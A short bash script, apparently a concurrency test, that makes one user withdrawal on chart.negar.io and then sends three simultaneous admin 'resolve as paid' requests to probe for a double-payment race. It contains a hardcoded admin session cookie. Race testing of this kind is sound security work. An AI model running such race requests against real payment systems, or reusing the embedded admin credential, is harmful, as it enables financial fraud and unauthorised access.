#!/bin/bash
# Runtime withdrawal race: user creates one withdrawal, 3 admins resolve concurrently
set -u
COOKIE_C="$1"
ADMIN_CK="chart_admin=8b12ecfd10326d01044deddb5e213c91304ff1873fd1e6068da4c2ca4de91f5b"

# 1) user C requests a withdrawal of 400k (balance 1,000,000); capture the id
WID=$(curl -s -b "$COOKIE_C" -X POST "https://chart.negar.io/api/wallet/withdraw" \
  -d 'amount_rial=400000' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('withdrawal_id','') or d.get('id','') or '')")
echo "WID=$WID"

# 2) three admins resolve it as 'paid' at the same time
pids=()
for i in 1 2 3; do
  curl -s -o /tmp/wd_race_$i.txt -w "call$i:%{http_code} " -X POST -b "$ADMIN_CK" \
    "https://chart.negar.io/api/admin/withdrawals/$WID/resolve" -d "status=paid" &
  pids+=($!)
done
for p in "${pids[@]}"; do wait "$p"; done
echo ""
for i in 1 2 3; do echo "call$i: $(head -c 100 /tmp/wd_race_$i.txt)"; done
